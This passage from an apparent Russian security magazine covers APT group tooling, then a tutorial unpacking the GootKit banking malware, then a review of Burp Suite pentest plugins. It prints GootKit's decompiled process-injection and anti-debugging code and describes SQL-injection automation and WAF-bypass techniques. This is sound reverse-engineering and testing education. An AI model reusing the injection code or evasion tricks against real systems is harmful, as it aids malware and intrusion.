URL]/home/index.asp?typeid=N,  где N —  случайное  нечетное  число
в диапазоне от 1 до 13. В ответ C&C присылает ключ (RC4) для шифрования
дальнейшего трафика в виде строки Base64, в которой все URL‐encoded сим‐
волы замене ны другими (например, символ подчеркивания вместо прямого
слеша).
   Etumbot сканирует зараженный компь ютер в поис ках конфигурации прок‐
си. Если прокси‐сервер обнаружен, то бэкдор нас траивает собственное под‐
клю чение в обход его, чтобы меньше светиться в логах.
  Всего у бэкдора шесть основных команд.
 1. ETUM_CMD_PING — про верить подключение к C&C.
 2. ETUM_CMD_PUTFILE — ска чать указанный файл с командного сервера.
 3. ETUM_CMD_READFILE — загрузить файл на C&C.
 4. ETUM_CMD_EXEC — выполнить команду из следующего пакета.
 5. ETUM_CMD_SLEEP — приостановить активность.
 6. ETUM_CMD_UNINSTALL — пол ностью уда лить себя из системы.

Наличие такого «аварийного тормоза» помогло специалистам Arbor Security
остановить эпидемию, перехватив управление командным сервером и отпра‐
вив команды 5, 6 от его имени.
   APT12  стала первой  китайской  группой кибершпионажа,  активность
которой помог снизить пуб личный отчет о ее деятельнос ти. Как только спе‐
циалисты Arbor Security опуб ликовали его, описали методики и указали
на связь с китайским правитель ством, члены APT12 залегли на дно.


APT16
Малоизвестная китайская группа APT16 преиму щественно атакует аккаунты
тайваньских политических активистов, журналис тов и японские правитель‐
ственные организации. Воз можно, она же фигурирует под наз ваниями OpTai‐
wan, SVCMONDR и Danti group или же просто сот рудничает с ними. В своих
атаках APT16 использовала ELMER — бес телес ный HTTP‐бэкдор с под дер‐
жкой обнаружения и обхода прокси, написанный на Delphi.
  В 2015 году APT16 успешно вос поль зовалась экс плоитом для удаленного
запуска произволь ного кода в MS Oﬃce при том, что на момент начала
фишинговой  кампании  патч  для  этой  уяз вимос ти  был  уже  полгода
как написан. Жертвам прос то рас сылались пись ма с файлом .docx, который
из‐за ошибки в обработке внедренного векторного рисунка (EPS) позволял
выпол нить произволь ный код (в данном случае — установить в системе
обратный шелл) при попытке его открыть.
  Дополнительно APT16 использовала троян‐даунлоадер IRONHALO. Он
маскировался в автозапус ке под видом Acrobat Reader по адресу %Program‐
Files%\Startup\AcroRd32Info.exe  и  при  каждом  запус ке  спрашивал
командный сервер, нужно ли заг рузить на компь ютер жертвы дру гие злов‐
реды. Инте ресно, что в качес тве жестко прописанного C&C был указан
легитимный веб‐сайт одной японской организации, который, по всей веро‐
ятности, взломали накануне фишинговой кампании.





                    Зап рос GET тро яна IronHalo

При положительном ответе следующий вредоносный компонент загружался
как последовательность строк Base64. Он сохранялся во временный файл
со случайным именем и рас ширением .dat, после чего декодировался, пере‐
именовывался  и  запускался  в  скры том  окне.  Привилегии  повышали
при помощи другого экспло ита, связанного с еще одной давно пропатченной
уязвимостью — CVE‐2015‐1701.
  С осени 2015 по лето 2016 года APT16 провела три крупных фишинговых
кампании, после чего временно исчезла с радаров либо объединилась с дру‐
гой хакерской группой.


ЗАКЛЮЧЕНИЕ
Техники APT‐групп очень наглядно выявляют реаль ные проблемы безопас‐
ности. В узком кругу специалис ты могут дискутиро вать о тонкостях алгорит‐
мов детектирования угроз раз ными антивирусами, обсуждать продвинутые
методы анализа трафика и осо бенности SIEM, но реальность куда прозаич‐
нее. Самые массовые ата ки выполняются с использовани ем самых при‐
митивных средств.
   Пользователи упорно кликают на все подряд и сами отключают защитные
средства по инструкции из фишинговых писем. Доверие к поставщикам
облачных услуг часто оказывается необос нованным, а инертность собствен‐
ных системных админис тра торов приводит к тому, что тысячи организаций
страдают из‐за двух старых уязвимостей.
  Подобное происходит регулярно, и именно это в итоге зас тавляет раз‐
работчиков принимать непопулярные решения. В частнос ти, отче ты аналити‐
ков подвигли Microsoft сделать в Windows 10 систему принудительной уста‐
новки обновлений, которая вызывает сейчас столько недовольства.


        WWW

                   •Обновляемый список известных APT‐групп
                    •Перечень инструмен тов APT‐групп
                     •Внедрение  зловредов  техникой  DLL  Side‐
                            loading
ВЗЛОМ





                                                 Nik Zerof
                                                 xtahi0nix@gmail.com



  ИСКУССТВО
 РАСПАКОВКИ

        ПОТРОШИМ ЗАЩИТУ
      ХИТРОГО БАНКЕРА GOOTKIT





Распаковка исполняемых файлов — одна из задач, возникающих при ревер‐
се. И если наш объект — это малварь, то зачастую приходится стал киваться
с кастомными упаковщиками. В этой статье я покажу, как справиться с защит‐
ными  механизмами  банкера  GootKit,  который  постоянно  развивается
и апгрейдится, к тому же использует разные методы сопротивления отладке.


             INFO

                   В прошлой  статье мы пробежались по азам
                      вскрытия кастомных пакеров, взяв для примера
                      вымогатель GlobeImposter 2.0. Он практически
                      не сопротивлялся распаковке и кое‐чем даже
                      помогал в этом деле.


Из инструментария мы будем использовать отладчик x64dbg (его 32‐битную
версию  x32dbg), интерактивный дизассемблер  IDA, шес тнадцатеричный
редактор HxD и детектор пакеров и протекторов DiE. Мы будем противос‐
тоять антиотладке при помощи мьютексов и раз беремся с нестандартны ми
параметрами функции CreateFileA.


           WARNING

                     Все описан ные в статье действия выполнялись
                         внутри виртуальной машины, которая была изо‐
                      лирована   от   сети.   Повторение   действий
                       на  основном  компьютере  может  привести
                          к  заражению  банкером  GootKit,  способ ным
                        похитить твои данные.


Для начала давай посмотрим на GootKit через программу Detect it Easy.





                Нерас пакованный обра зец GootKit

Детектор не определяет никакой навесной защиты, зато энтропия файла
зашкаливает.





                      Энтро пия GootKit

Загружаем файл в дизассемблер для более интимного знакомства. Видим,
что при входе у нас сразу идет вызов подпрограммы. Пры гаем в него и наб‐
людаем достаточ но интерес ный код.





На стек помещаются зна чения, инициализируются переменные, далее идут
вызовы. Разумеется, это похоже на динамичес кий вызов функций.
   Чтобы самостоятельно убедиться в этом, можешь скомпилировать и пос‐
мотреть в IDA простую программу, которая исполь зует эту технику вызовов.
Конечно, код будет более «чистый» и понятный, но общая суть очевидна.


int main()
{
  typedef NTSTATUS(WINAPI *pNtQueryInformationProcess)(HANDLE, UINT,
PVOID, ULONG, PULONG);
  ULONG dProcessInformationLength = 0;
  PVOID DbgPort;
  pNtQueryInformationProcess pNtQueryInfoProcess = (pNtQueryInforma
tionProcess)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuer
yInformationProcess");
  NTSTATUS Status = pNtQueryInfoProcess(GetCurrentProcess(),7,&
DbgPort,dProcessInformationLength,NULL);
  if (Status == 0x00000000) return 0;
    return 0;
}

Давай переключимся в псевдокод, нажав кнопку F5, так будет еще очевиднее.





                           Псевдокод

Инициализация и вызов функций выглядит таким обра зом:


v3 = v1(byte_41F00C, byte_41F0F8);
v33 = (void (__stdcall *)(char *, char *))v2(v3);
v4 = v1(byte_41F00C, byte_41F0EC);
v32 = (int (__stdcall *)(char *))v2(v4);
v5 = v1(byte_41F0A4, byte_41F0B0);

И тем не менее код кажется странным, хоть и очевидно, как он работает и что
делает. Посмотрим перекрестные ссылки на буфера, которые передаются
в функции. Вот один из буферов.





Очевидно, применяется шифрование строк при помощи XOR по ключу
89798798798g79er$. Видим шифротекст byte_41F000[edi].





Псевдокод этого алго ритма такой:


do
  {
    byte_41F000[v30] ^= a89798798798g79[v30 % v29];
    ++v30;
  }
  while ( v30 < 11 );
  v31 = strlen(a89798798798g79);

Зная  ключ, попробуем рас шифровать содержимое буфера средс твами
Python, который встроен в IDA. Набира ем


x = idc.GetManyBytes(0x41F0EC, 0x0B)

Пишем байты по адресу 0x41F0EC в количестве 0x0B в переменную encrypt.
Проверим, просто вве дя имя переменной и нажав Enter:


Python>encrypt = idc.GetManyBytes(0x41F000, 0x9)
Python>encrypt
hJVIQl]T[

Все верно: это именно то, что мы видели в IDA. Теперь присвоим переменной
y известный нам пароль и зададим переменную decrypt для выходных дан‐
ных:


Python>y = "89798798798g79er$"
Python>decrypt = ""

Теперь приступим к циклу дешифровки.


Python>for i in range(0 , len(encrypt)):
Python>decrypt += chr(ord(encrypt[i]) ^ ord(y[i%len(y)]))
Python>decrypt
Psapi.dll

Мы смогли расшифровать строку, и у нас получилось Psapi.dll. Таким образом
можно расшифровать все зашифрованные строки и соотнести их с перемен‐
ными в псевдокоде. Лис тинг преобра зился и стал намного более понятным.
Теперь нам ясно, какие WinAPI получа ются динамически. Скроллим псев‐
докод ниже и видим:


if ( !(unsigned __int8)sub_401454() || !v36(v18, 0, 1000, 12288, 64,
0) || !(unsigned __int8)sub_401454() )
{
  CreateMutexA(0, 1, "fz7ef7z9e7f98ze7f97ze");
  result = (FILE *)GetLastError();
  if ( result != (FILE *)183 )
    return result;
  return (FILE *)sub_401E47();
}
CreateMutexA(0, 1, "321e89r7g98e7rg89er");
if ( GetLastError() == 183 )
  return (FILE *)sub_401E47();
GetModuleFileNameA(0, &v42, 260);
v21 = strlen(&v42);
v22 = strlen(byte_41F090);
v23 = (char *)GlobalAlloc(0x40u, v21 + 2 + v22);
v33(v23, &v42);
strcat(v23, byte_41F090);
v24 = v32;
while ( !v24(v23) && v9 < 300 )
{
  Sleep(1);
  ++v9;
}
ShellExecuteA(0, 0, &v42, "‐l", 0, 0);
return (FILE *)((int (__stdcall *)(signed int))Sleep)(2000);

Здесь заметна работа с мьютексами и запуск еще одной копии собственного
процесса через ShellExecuteA с парамет ром ‐l. Вообще, когда есть подоб‐
ный код, неплохо запустить наш вирус в какой‐нибудь анализи рующей песоч‐
нице, чтобы видеть, какие процессы в каком порядке создаются. Давай это и
сделаем.
   Есть несколько онлайновых песочниц, которые подходят для этих целей,
многие из них платные. Но есть и бес платные, например hybrid‐analysis.com.
Закидываем семпл в песочницу и смотрим на резуль тат.





                   Результат гиб ридно го анализа

В этом дереве процессов нас интересу ют три первых: сначала запускается
основной семпл, потом он же с параметром командной строки ‐l, а третий
процесс, вероятно, наш целевой распакованный код. Возвращаемся к иссле‐
дованию защиты.
  Обрати внимание на строки создания мьютексов и на этот код:


ShellExecuteA(0, 0, &v42, "‐l", 0, 0);
return (FILE *)((int (__stdcall *)(signed int))Sleep)(2000);

После создания процесса родительский про цесс спит две секунды, а потом
завершается. Запомним этот момент и идем даль ше. Найдем код соз дания
процесса, который создается копией процесса с параметром ‐l. Для этого
в таблице импорта просматриваем вызовы и находим CreateProcessA. Идем
по перекрестной ссылке и находим функцию sub_403A56(CHAR *a1, void
*a2) и вот такой код в ней (я расшифровал имена вызовов WinAPI и пере име‐
новал одну переменную для удо бочитаемос ти кода).


memset(&StartupInfo, 0, 0x44u);
memset(&ProcessInformation, 0, 0x10u);
for ( i = CreateProcessA(0, v2, 0, 0, 0, 4u, 0, 0, &StartupInfo, &
ProcessInformation);
    ;
    i = CreateProcessA(0, lpCommandLine, 0, 0, 0, 4u, 0, 0, &Startu
pInfo, &ProcessInformation) )
{
if ( !i )
  return 1;
if ( *(_WORD *)inject_code != 23117 )
{
  NtTerminateProcess(ProcessInformation.hProcess, 1);
  return 1;
}
v5 = (int)inject_code + *((_DWORD *)inject_code + 15);
NtGetContextThread(ProcessInformation.hThread, &v15);
NtReadVirtualMemory(ProcessInformation.hProcess, v16 + 8, &v11, 4, 0)
;
if ( v11 == *(_DWORD *)(v5 + 52) )
  NtViewUnmapOfSection(ProcessInformation.hProcess, v11);
v6 = VirtualAllocEx(ProcessInformation.hProcess, *(_DWORD *)(v5 + 52)
, *(_DWORD *)(v5 + 80), 12288, 64);
if ( v6 )
  break;
GetLastError();
if ( !v14 )
{
  NtTerminateProcess(ProcessInformation.hProcess, 1);
  return 1;
}
‐‐v14;
NtTerminateProcess(ProcessInformation.hProcess, 1);
}
NtWriteVirtualMemory(ProcessInformation.hProcess, v6, inject_code, *(
_DWORD *)(v5 + 84), 0);
v14 = 0;
if ( *(_WORD *)(v5 + 6) > 0u )
{
v7 = 0;
lpCommandLine = 0;
do
{
  NtWriteVirtualMemory(
    ProcessInformation.hProcess,
    v6 + *(_DWORD *)&v7[*((_DWORD *)inject_code + 15) + 260 + (_DWORD
)inject_code],
    (char *)inject_code + *(_DWORD *)&v7[*((_DWORD *)inject_code + 15
) + 268 + (_DWORD)inject_code],
    *(_DWORD *)&v7[*((_DWORD *)inject_code + 15) + 264 + (_DWORD)
inject_code],
    0);
  v8 = *(unsigned __int16 *)(v5 + 6);
  v7 = lpCommandLine + 40;
  ++v14;
  lpCommandLine += 40;
}
while ( v14 < v8 );
}
v17 = v6 + *(_DWORD *)(v5 + 40);
NtWriteVirtualMemory(ProcessInformation.hProcess, v16 + 8, v5 + 52, 4
, 0);
NtSetContextThread(ProcessInformation.hThread, &v15);
NtResumeThread(ProcessInformation.hThread, 0);
VirtualFree(inject_code, 0, 0x8000u);
return 0;

Пытливый читатель сразу поймет, что это стандартная инжекция кода в про‐
цесс, который здесь же и соз дается. Да, это тот процесс, который порож‐
дается экземпляром приложения, запущенного с параметром ‐l. Мы видим,
как данные записываются в память процесса, устанавливается контекст
потока, затем поток возобновляется.
   Естественно, мы можем увидеть в вызове NtWriteVirtualMemory, какие
именно данные записывают ся. Давай прос ледим, откуда вызывается функция
sub_403A56(CHAR *a1, void *a2). Кроме того, я рекомендую переиме‐
новать эту функцию в inject, чтобы было удоб нее и понятнее в дальнейшем.


sub_402133();
v0 = f_GetModuleFileNameA();
sub_401A77(v0);
v1 = (int *)sub_401BCE((char *)dword_41FBCC);
v3 = v2;
inject_code = v1;
*(_BYTE *)(v2[3] + v1[3]) = 0;
v5 = sub_401CFB(*v1, v1[3], *v2, v2[3]);
v6 = inject_code[3];
v7 = inject_code[6];
*inject_code = v5;
v8 = sub_401CFB(v7, v6, v3[6], v3[3]);
v9 = inject_code[3];
v10 = inject_code[7];
inject_code[6] = v8;
v11 = sub_401CFB(v10, v9, v3[7], v3[3]);
v12 = inject_code[6];
inject_code[7] = v11;
sub_401EFF(v12, v3[6]);
sub_401EFF(inject_code[7], v3[7]);
proc_name = (CHAR *)f_GetModuleFileNameA();
inject(proc_name, (void *)*inject_code);
return 0;

В этой небольшой функции в памяти создает ся буфер и в него дешифруется
код, а затем происходит инжект. Посмотрим перекрес тную ссылку на эту фун‐
кцию, и… мы возвращаемся в код с мьютексами. А функция, из которой мы
вернулись, называется sub_401E47(). Получа ется, основная распаковка
выпол няется именно в этом месте приложения. Давай попробуем разобрать‐
ся, зачем тут мьютек сы. Я сократил код, оста вив самую суть, и переименовал
известную нам функцию.


...
CreateMutexA(0, 1, "fz7ef7z9e7f98ze7f97ze");
result = (FILE *)GetLastError();
if ( result != (FILE *)183 )
  return result;
return (FILE *)wrapper_create_and_inject();
}
CreateMutexA(0, 1, "321e89r7g98e7rg89er");
if ( GetLastError() == 183 )
return (FILE *)wrapper_create_and_inject();
...
ShellExecuteA(0, 0, &v42, "‐l", 0, 0);
return (FILE *)((int (__stdcall *)(signed int))Sleep)(2000);

Антиотладочный трюк состоит в том, что родительский процесс создает
мьютекс и проверяет, не создан ли он ранее. Далее порождается дочерний
процесс, и он тоже проверя ет мьютекс. Дело в том, что родительский про‐
цесс умирает спустя две секунды, и если бы мы отлаживали этот код, то в тот
момент, когда бы мы приступили к отладке потомка, родительский процесс
был бы уже мертв и созданного им мьютекса не было бы. Получается прос‐
той, но интересный способ про верить целостность своих процессов и отсле‐
дить факт отладки.
   Итак, теперь мы зна ем, как устро ена антиотладка. Давай попробуем
заполучить распакованный образец банкера. Для этого мы загружаем семпл
в отладчик и останавлива емся на точке входа. Теперь нам нужно установить
точку останова в тот момент, когда создает ся новый процесс (помнишь, что
процессов порождается нес колько?). Установим точку останова на функцию
CreateProcessInternalW.


             INFO

                Мы установили точку останова на функцию Cre‐
                   ateProcessInternalW потому, что все фун‐
                         кции,        порождающие         процессы
                                   (CreateProcess,   CreateProcessAsUser,
                   CreateProcessWithTokenW и CreatePro‐
                   cessWithLogonW), в итоге вызывают именно
                          эту недокументированную функцию.


Отладчик остановился, и мы можем видеть, что создано два процесса и мы
стоим на точке распаковки малвари в память. Нужно понимать, что сейчас
мьютексы созданы и мы не даем приложению завершиться.





                    Стек вызовов на точке оста нова

Нам необходимо свернуть отладчик и запус тить еще один его экземпляр, заг‐
рузить туда наш банкер и пос тавить точку оста нова на функцию CreateFileA.
Мы остановились на моменте соз дания фай ла, теперь давай посмотрим
параметры функции CreateFileA. Я выделил интересу ющее нас поле крас‐
ным.





                    Стек вызовов на точке оста нова

Вот прототип функции CreateFileA.


HANDLE CreateFileA(
LPCSTR                lpFileName,
DWORD                 dwDesiredAccess,
DWORD                 dwShareMode,
LPSECURITY_ATTRIBUTES lpSecurityAttributes,
DWORD                 dwCreationDisposition,
DWORD                 dwFlagsAndAttributes,
HANDLE                hTemplateFile
);

Третий параметр, dwShareMode, установлен в ноль, что задает «режим сов‐
местного доступа». Нулевое зна чение запрещает вся ческий доступ извне
или повторный доступ из самого приложения, пока дескриптор файла
не будет закрыт. Изменим на 7 — это разрешит все доступы. После этого
даем доработать функции и оста навливаемся сра зу пос ле возврата из нее.
   Теперь запускаем приложение и не забыва ем о точке останова на Cre‐
ateProcessInternalW. После останова в стеке — параметры создания про‐
цесса с флагом CREATE_SUSPENDED. Зна чит, это именно наша инъ екция
из буфера в процесс. Перейдем к карте памяти и поищем сигнатуру MZ —
ведь в данный момент рас пакованный файл находится в памяти. Точнее, даже
два файла — ты ведь еще не забыл дерево процессов? Но интересует нас
только один.
  Первое вхождение — по адресу 0017BBB6. Ищем  в карте памяти
по базовому адресу 700xxx нужный образ. Оста лось только снять дамп,
в котором будет два обра за PE‐файла, которые мы раз деля ем при помощи
hex‐редактора HxD. Один из образов нам уже зна ком, а вот второй и есть наш
искомый распакованный банкер.





                      Рас пакованный GootKit

В IDA видно, что код отличается от исходно го семпла, а также просматривает‐
ся таблица импорта. Бинго! :)
ВЗЛОМ

    ПРОКАЧАЙ СВОЙ
  BURP!





          11 НАИБОЛЕЕ ПОЛЕЗНЫХ
       ПЛАГИНОВ К BURP SUITE





                                                 aLLy
                                              ONsec
                                                    @iamsecurity




Поиск веб‐уязвимостей и Burp Suite — это практически
синонимы. Однако мощь тво его Burp напрямую зависит
от выбора присадок к нему. В этой статье я собрал один‐
надцать плагинов, которые постоян но использую в работе,
и расскажу о том, какой вклад каждый из них вносит
в облегчение и ускорение пентестерской деятельности.


1. Burp Vulners Scanner
https://github.com/vulnersCom/burp‐vulners‐scanner
   Этот плагин показывает публичные уяз вимос ти для приложений, обна‐
руженные в трафике, который проксиру ет Burp. Рас ширение было написано
Иваном Ёлкиным, одним из сооснователей сервиса vulners.com. Представ‐
ляет собой, по сути, прос лойку между Burp и API это го отличного агре гатора
уязвимостей.
  Работает все предельно просто. Настраиваем прокси‐сервер, а затем
ходим по сайту или тыкаем в веб‐приложение. В это время плагин анализи‐
рует трафик, находит в нем маркеры уста новленного на удаленной машине
софта и детектирует версии. Сюда входят веб‐серверы (nginx, Apache, Tomcat
и так далее), все возможные CMS (WordPress, Drupal, Joomla и другие) и про‐
чее. Затем обнаруженная информация отправляется в виде запросов к API
vulners.com, а нам в красивом окош ке выводится список доступных уязвимос‐
тей.





     Результат поиска уяз вимос тей с помощью плагина Vulners Scanner

В настройках можно изменять существующие или добавлять новые правила
для определения и поиска уяз вимых при ложений.





    Просмотр правил для определения и поиска уязвимых приложений

В целом Vulners Scanner — очень удобная штука. Пока я вручную изучаю цель,
сканер на автомате ищет потенциальные уяз вимос ти.





2. SQLiPy
https://github.com/PortSwigger/sqli‐py
   SQLiPy помогает с автоматизацией SQL‐инъекций. Этот плагин тоже
работает с API — тем, что предоставляет популярная утилита SQLMap.
Думаю, что каждый, кто когда‐либо возился с SQLi, слышал про эту тулзу.
Однако не все знают, что она может работать в режиме REST API. Для этого
ее нужно запустить таким образом:


python sqlmapapi.py ‐s ‐H <ip‐адрес> ‐p <порт>

Обрати  внимание,  что  существу ет  воз можность  запуска  API  прямо
из интерфейса расширения. Но даже сами разработ чики рекомендуют запус‐
кать его из командной строки.





                    Нас трой ка плагина SQLiPy

Затем во вкладке SQLMap Scanner в нас трой ках плагина нужно указать адрес
нашего API. Теперь все, что от тебя требуется, — это выбрать подопытный
запрос, кликнуть правой кнопкой мыши внут ри его тела и выбрать пункт
SQLiPy Scan.





            Выбор запроса для отправки его в SQLMap

Снова откроется вкладка SQLMap Scanner, но уже с заполненными данными
по запросу. Тут ты можешь ука зать целую вязанку параметров, которые дос‐
тупны в утилите SQLMap. Пос ле нас тройки нажимаем Start Scan. Если атака
успешна, то ее детали будут видны в панели Issues.





        Найденная уязвимость типа SQL‐инъекция в панели Issues

Если же тебя интересует более подробная информация о процессе сканиро‐
вания, то ее можно отыскать на закладке SQLMap Logs. Выбирай нужный про‐
цесс и жми кнопку Get.





                 Результаты сканирования в SQLiPy

Как ты уже понял, плагин поддерживает несколько процес сов сканирования.
Лично у меня на выделенном сервере тусуется такой вот API, и, не отры ваясь
от исследования приложения, я пери одичес ки отправляю на него подоз‐
рительные запросы через SQLiPy.


3. ActiveScan++
https://github.com/PortSwigger/active‐scan‐plus‐plus
  Об этом плагине, я думаю, слышал каждый поль зователь Burp Suite. Он
написан одним из штатных раз работчиков PortSwigger Джеймсом Кеттле
(James Kettle), а первый коммит датирован 23 июня 2014 года. Но обновля‐
ется плагин и по сей день, что встречается нечасто.
   ActiveScan++ расширяет стандартный перечень проверок, которые выпол‐
няются при работе активно го и пас сивного сканера. Он находит такие уяз‐
вимости, как cache poisoning, DNS rebinding, различные инъ екции в темплей‐
ты и экспрешены, а также делает дополнительные проверки для обнаруже ния
XXE‐инъекций и выявляет популярные баги типа shellshock, вы полнение про‐
извольного кода в Struts2 (CVE‐2017‐5638) и тому подоб ные.
  Никаких настроек плагин не имеет, он просто тихонько работает и отправ‐
ляет сообщения о найденных проблемах в панель Issues.





  RCE‐уязвимость Struts2 CVE‐2017‐9805, найденная с плагином
  ActiveScan++

Кстати, на всякий случай рас ска жу, что если тебе необ ходимо натравить
активный сканер толь ко на определенные места в запросе, то запрос нужно
добавить в Intruder, расста вить § в нуж ных позици ях, а затем нажать правой
кнопкой мыши и выбрать Actively scan deﬁned insertion points.





        Указываем кастомные места в запросе для активного скана


4. Backslash Powered Scanner
https://github.com/portswigger/backslash‐powered‐scanner
  Еще один тихий плагин, созданный Джеймсом Кеттле. Нужен он, чтобы
обнаруживать как известные, так и неизвес тные типы уязвимостей. Манипу‐
лируя всевозможными параметрами из запроса, рас ширение пытается
выявить нестандартное поведение сервера. Такие аномалии могут помочь
при обнаружении как простых уяз вимостей типа error‐based SQL‐инъекций,
так и сложных XSS‐инъекций с обхо дом встроенного WAF. Разумеется, плагин
не дает полностью готовые решения, но может натол кнуть тебя на правиль‐
ный путь.
  В отличие от ActiveScan++ здесь есть некоторое количес тво настроек. Они
расположены в пункте главного меню под названием Backslash, что нехарак‐
терно.





            Настрой ки плагина Backslash Powered Scanner

Сканирование также идет в автоматичес ком режиме при работе активного
сканера самого Burp. Если в процессе сканирования что‐нибудь будет обна‐
ружено, то результаты добавят ся в панель Issues.





       Аномалии, найденные плагином Backslash Powered Scanner

За дополнительной информацией о методике тес тирования можно обратить‐
ся к посту в блоге PortSwigger.


5. SHELLING
https://github.com/ewilded/shelling
  Отличное расширение для обна ружения уязвимостей типа RCE. Может
использоваться как в авто матическом, так и в ручном режиме. Помимо прос‐
тых тестов, пытается выполнить обход всевозможных фильтров пользователь‐
ских данных.
  На момент написания статьи в магази не рас ширений Burp Suite была ста‐
рая версия этого плагина. Поэтому качай из репозитория актуальную и уста‐
навливай ручками.
  После успешной инсталляции появится новая вкладка под наз ванием
SHELLING. Она, в свою очередь, содержит еще пачку табов, в которых рас‐
положены многочисленные нас тройки рас ширения.





                   Нас трой ки плагина SHELLING

Здесь можно выбрать и тип атакуемой ОС, и пей лоад, который будет исполь‐
зоваться для получения отстука об успешно выполненной команде, перек‐
лючение режима сканиро вания и многое‐многое дру гое.
   Также возможно выгрузить пейлоады в виде текстового файла и исполь‐
зовать их в Intruder или в любой другой утилите.





    Вкладка с возможностью сохранения пейлоадов в плагине SHELLING

Описать все настрой ки в одной статье — дело проблематичное. Поэтому
оставляю тебе это на домашнее изу чение, бла го в официальном репози‐
тории имеется исчерпывающий мануал по всем доступным функциям рас‐
ширения.


6. AuthMatrix и Autorize
https://github.com/PortSwigger/auth‐matrix
https://github.com/PortSwigger/autorize
  Два плагина, которые, по сути, делают одно и то же и раз личаются только
возможностями детальной нас тройки и интерфейсом. Нужны они для того,
чтобы проверять кор ректность логики распределения прав дос тупа в при‐
ложении. Сейчас редко можно встретить какой‐нибудь сервис, где не исполь‐
зуется система различных ролей поль зователей. Так вот, частенько бывает,
что администраторские разделы дос тупны и обычным пользователям. Чтобы
автоматизировать такие проверки, я использую эти два плагина.
   AuthMatrix можно наз вать старшим бра том Autorize: у него чуть больше
опций и немного более гибкая настройка тестирования. Обычно мне хватает
AuthMatrix.
  Логика работы сле дующая. Логиним ся в систему, например от админис‐
тратора. Снифаем трафик по ходу того, как бега ем по раз ным разделам, дос‐
тупным выбранному юзеру. Потом на вкладке Target или Proxy выбираем нуж‐
ные запросы и отправляем их в плагин через соответству ющий пункт в кон‐
текстном меню.





              Отправляем запросы в плагин AuthMatrix

После этого переходим на вкладку с плагином, где видим наши запросы.





                     Вкладка плагина AuthMatrix



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
     ПРОКАЧАЙ СВОЙ
              BURP!
                       11 НАИБОЛЕЕ ПОЛЕЗНЫХ ПЛАГИНОВ
                                     К BURP SUITE




Теперь нужно добавить пользователей. Это можно сделать, если нажать
на кнопку New User и ввести имя пользователя. Теперь в таблице Cookies
нужно заполнить соот ветствующие данные для каж дого из созданных поль‐
зователей. Куки, которые ты здесь укажешь, будут добавлены к тем, что
находятся в запросе.





                   Нас трой ка плагина AuthMatrix

В примере я планирую проверить дос тупность страниц установки и настрой ки
безопасности от админа (пользователь root) и анонима (пользователь guest).
Поэтому куки для Guest пусты.
  Затем я создал название ролей и поставил галочки для соответс твующих
пользователей. Почему существу ет воз можность добавлять и роли, и поль‐
зователей? Это нужно, чтобы проверять те ситу ации, когда определенные
функции доступны только конкретному пользователю. Например, два разных
юзера в системе дол жны видеть только свои приватные сообщения.
   Теперь требуется расста вить галочки соответс твия: какие пользователи
или роли какие запросы могут выполнять. В моем случае оба запроса могут
выпол нять только админы, что я и ука зал. После этой настройки остается
только нажать на кнопку Run и немного подождать.




                Результаты работы плагина AuthMatrix

Результаты тестирования отображаются в таблице в виде цветовых индикато‐
ров. Зеленый цвет означает, что поведение нормальное, ответ от сервера
был проверен с помощью регулярного выражения, указанного в Response
Regex, и он соответствует ожиданию. То есть в ответе для пользователя Root
(роль админа) он попада ет в regex, а в ответе для пользователя Guest (роль
анонима) — нет.





      Детали проверки системы ролей плагином AuthMatrix. Все ОK

Красный цвет сигнализирует о том, что в этом месте, возможно, существует
уязвимость  (то есть ответ в обо их случаях соответствует регулярному
выражению).





  Детали проверки системы ролей плагином AuthMatrix. Возможная уяз‐
  вимость!

Существует еще и синий цвет, его ты увидишь в том слу чае, когда рас‐
ширение предполагает, что результат может быть ложноположительным.
  Помимо куки, плагин поддерживает кастомные заголовки. Это поз воляет
покрыть случаи, когда авторизация выполняется при помощи различных
токенов, например Bearer. Этот столбец можно добавить при помощи кнопки
New Header.
   Также есть возможность задать сложные цепочки дей ствий. Например,
если  требуется  получать для каждого  запроса валидный  токен CSRF.
Для добавления звена такой цепочки есть кнопка New Chain. Подробнее
об этом можно прочитать в официальном репозитории плагина.
   Autorize добавляет ко всему это му еще несколько интересных опций. Нап‐
ример, в нем можно авто матичес ки про верять все проходящие через прокси
запросы.





    Автоматическая проверка всех вхо дящих запросов в плагине Autorize

Оба плагина могут сохранять текущее состояние и настройки в отдельный
файл, а Autorize умеет генерировать отчеты с резуль татами тестирования.


7. Burp HTTP Mock
https://github.com/PortSwigger/http‐mock
  HTTPMock позволяет эмулировать произвольные ответы от сервера.
Это полезно для тестирования ошибок на стороне фронтенда. С повсемес‐
тным засильем SPA, REST API и мобиль ных приложений это просто незаме‐
нимая штука.
   Чтобы воспользовать ся возможностями Mock, нужно добавить в него
ответ от сервера для эмуляции. Это можно сделать вручную или выбрать
существующий ответ из отснифанного тра фика (это делается из контекстного
меню).





         Отправка ответа от сервера в рас ширение HTTPMock

Теперь во вкладке HTTPMock в разделе Mock rules появится твой ответ. Стол‐
бцы Host, Port и File отвечают за адрес, к которому будет эмулироваться ответ
из Response editor. Здесь мож но писать регулярные выраже ния, что добав‐
ляет гибкости.
  Я взял попавшееся под руку приложение для заказа пиццы и перехватил
пакет с запросом информации о текущем пользователе. Добавил ответ
на него в HTTPMock и изменил параметр count_points, который отве чает
за количество бонусных баллов.





                Редактирова ние эмулиру емого ответа

Теперь запрос от приложения для получения инфы о юзере будет перех‐
ватываться расширением, а измененный ответ предос тавлен приложению
как легитимный. Результат такой подмены можно наб людать на скрине ниже.





          Подмена ответа от сервера через плагин HTTPMock

Разумеется, это лишь один сценарий использования. Таким же образом мож‐
но вводить в заблуждение любые клиенты и искать несостыковки в их логике
работы.


8. Bypass WAF
https://github.com/portswigger/bypass‐waf
   Расширение с громким наз ванием Bypass WAF, написанное Джошем Бер‐
ри (Josh Berry), позволяет пользовать ся рядом трюков, которые помогут
в нелегкой борьбе с навяз чивым файрво лом. Если этот зверь не дает тебе
спокойно раскручивать очередную SQL‐инъекцию или вовсе режет твои
безобидные зап росы, то Bypass WAF — твой выбор.
  Среди трюков имеются такие шту ки, как подмена популярных заголовков
X‐Originating‐IP, X‐Forwarded‐For, X‐Remote‐IP, X‐Remote‐Addr (бывает, что
запросы с локальной машины проходят мимо пристального взора WAF), раз‐
личные  манипуляции  с  Content‐Type  (случается,  что  под  фильтрацию
не попадают какие‐то MIME‐типы), раз нооб разная обфускация отправляемых
параметров и все в таком духе. Настройка всего этого безоб разия произво‐
